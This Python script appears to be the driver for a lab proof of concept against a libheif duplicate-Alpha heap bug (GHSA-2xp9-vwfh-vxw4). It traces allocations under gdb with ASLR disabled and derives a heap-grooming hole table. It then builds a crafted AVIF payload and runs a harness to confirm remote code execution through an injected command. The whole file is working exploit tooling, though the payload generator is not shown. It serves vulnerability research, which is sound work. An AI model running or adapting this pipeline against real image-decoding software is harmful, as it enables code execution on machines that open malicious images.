#!/usr/bin/env python3
"""
One-shot driver for the libheif duplicate-Alpha exploit lab
(GHSA-2xp9-vwfh-vxw4). Runs the complete pipeline inside the `exp` container:

  1. build the calibration payload and trace the decode allocation sequence
     with gdb (mode 0, no grooming)
  2. derive the hole table (exact-size holes for every decode allocation,
     freed in reverse consumption order so the unsorted-bin head always
     matches the next request)
  3. build the exploit payload (crafted size field + inflated length)
  4. run the harness in exploit mode and check /tmp/pwned_by_libheif

Usage:  python3 driver.py            (build + full run)
        python3 driver.py 2          (calibration dump only)
        python3 driver.py 3          (exploit run with existing holes/payload)
"""

import subprocess, sys, re, os

SELF = os.path.dirname(os.path.abspath(__file__))
STAGE = sys.argv[1] if len(sys.argv) > 1 else "all"


def sh(cmd):
    r = subprocess.run(["docker", "compose", "-f", "docker-compose.yml",
                        "exec", "exp", "bash", "-c", cmd],
                       capture_output=True, text=True, cwd=SELF)
    return r.stdout, r.stderr, r.returncode


def step(msg):
    print(f"\n=== {msg} ===")


def hole_args(trace_path):
    sizes = []
    for line in open(trace_path):
        m = re.match(r"(?:malloc|calloc) (\d+)", line)
        if m:
            sizes.append(int(m.group(1)))
    body = sizes[2:]      # skip pre-main startup allocations
    return body[::-1]     # free order = reverse consumption order


if STAGE in ("1", "all"):
    step("1. trace allocation sequence (mode 0, gdb)")
    out, err, rc = sh(
        "cd /src/work && python3 gen_exp.py --calib && "
        "cp payload-calib.avif /src/payload.avif && "
        "setarch -R gdb -batch -x /src/work/trace.gdb "
        "--args /src/harness 0 /src/payload.avif "
        "2>/dev/null | grep -E '^(malloc|calloc)' > /src/work/trace.txt; "
        "wc -l < /src/work/trace.txt")
    print(out.strip(), err[-200:] if err else "")
    holes = hole_args(os.path.join(SELF, "trace.txt"))
    with open(os.path.join(SELF, "holes.txt"), "w") as f:
        f.write(" ".join(str(h) for h in holes))
    print(f"[+] {len(holes)} holes -> holes.txt")

if STAGE in ("2", "all"):
    step("2. build exploit payload")
    out, err, rc = sh("cd /src/work && python3 gen_exp.py --exploit && "
                      "cp payload-exploit.avif /src/payload.avif")
    print(out.strip() or err[-300:])

if STAGE in ("3", "all"):
    step("3. run exploit")
    holes = open(os.path.join(SELF, "holes.txt")).read().split()
    out, err, rc = sh(
        f"rm -f /tmp/pwned_by_libheif; "
        f"setarch -R /src/harness 1 /src/payload.avif {' '.join(holes)}")
    for line in (out + err).splitlines():
        if line.startswith("[*]"):
            print(line)
    out2, _, _ = sh("ls -la /tmp/pwned_by_libheif")
    if "pwned_by_libheif" in out2:
        print("\n[+] RCE SUCCESS: /tmp/pwned_by_libheif was created by the "
              "injected command")
    else:
        print("\n[-] exploit did not fire (check output above)")
